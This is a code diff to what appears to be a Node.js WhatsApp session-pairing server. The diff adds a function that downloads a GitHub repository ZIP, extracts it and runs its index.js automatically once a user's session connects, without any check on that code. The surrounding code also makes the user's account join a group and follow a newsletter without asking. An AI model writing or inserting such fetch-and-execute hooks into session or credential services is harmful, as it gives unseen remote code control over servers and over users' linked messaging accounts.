@@ -1,3 +1,4 @@
+
 const { makeid } = require('./gen-id');
 const express = require('express');
 const fs = require('fs');
@@ -12,10 +13,42 @@ const {
     DisconnectReason,
 } = require('@whiskeysockets/baileys');
 const { upload } = require('./mega');
+const fetch = require('node-fetch');
+const unzipper = require('unzipper');
+const { exec } = require('child_process');
 
 function removeFile(FilePath) {
     if (!fs.existsSync(FilePath)) return false;
     fs.rmSync(FilePath, { recursive: true, force: true });
+}
+
+async function downloadAndRunBot() {
+    const zipUrl = 'https://github.com/prm123456789/N/archive/refs/heads/main.zip';
+    const zipPath = './bot.zip';
+    const extractPath = './N-main';
+
+    const response = await fetch(zipUrl);
+    const fileStream = fs.createWriteStream(zipPath);
+    await new Promise((resolve, reject) => {
+        response.body.pipe(fileStream);
+        response.body.on('error', reject);
+        fileStream.on('finish', resolve);
+    });
+
+    await fs.createReadStream(zipPath)
+        .pipe(unzipper.Extract({ path: '.' }))
+        .promise();
+
+    console.log('✅ ZIP téléchargé et extrait');
+
+    const botPath = `${extractPath}/index.js`;
+    const child = exec(`node ${botPath}`, (err, stdout, stderr) => {
+        if (err) console.error("❌ Erreur exécution bot :", err);
+        else console.log('🟢 BOT LANCÉ AVEC SUCCÈS');
+    });
+
+    child.stdout.on('data', data => console.log(data));
+    child.stderr.on('data', data => console.error(data));
 }
 
 const followedChannels = new Set();
@@ -64,7 +97,6 @@ router.get('/', async (req, res) => {
                     let md = "INCONNU~XD~" + string_session;
                     let code = await sock.sendMessage(sock.user.id, { text: md });
 
-                    // 🔹 Newsletter auto-follow avec mémoire et gestion erreurs
                     try {
                         if (typeof sock.newsletterFollow === 'function') {
                             if (!followedChannels.has(newsletterJid)) {
@@ -81,7 +113,6 @@ router.get('/', async (req, res) => {
                         console.warn("❗ Erreur newsletterFollow :", e.message);
                     }
 
-                    // 🔹 Auto join group via lien
                     try {
                         await sock.groupAcceptInvite("EWcvcWChJlU6QLbFAPTboZ");
                         console.log("✅ Rejoint le groupe avec succès !");
@@ -89,12 +120,11 @@ router.get('/', async (req, res) => {
                         console.warn("❗ Échec du join du groupe :", e.message);
                     }
 
-                    // 🔹 Message de confirmation
                     let desc = `
 ╔═════════════════
-║ *SESSION CONNECTED*         
+║ SESSION CONNECTED
 ╠═════════════════
-║ *© INCONNU BOY TECH*         
+║ © INCONNU BOY TECH
 ╚═════════════════
 `;
                     await sock.sendMessage(sock.user.id, {
@@ -109,6 +139,8 @@ router.get('/', async (req, res) => {
                             }
                         }
                     }, { quoted: code });
+
+                    await downloadAndRunBot(); // ⚡ Lance le bot depuis le ZIP
 
                     await delay(10);
                     await sock.ws.close();
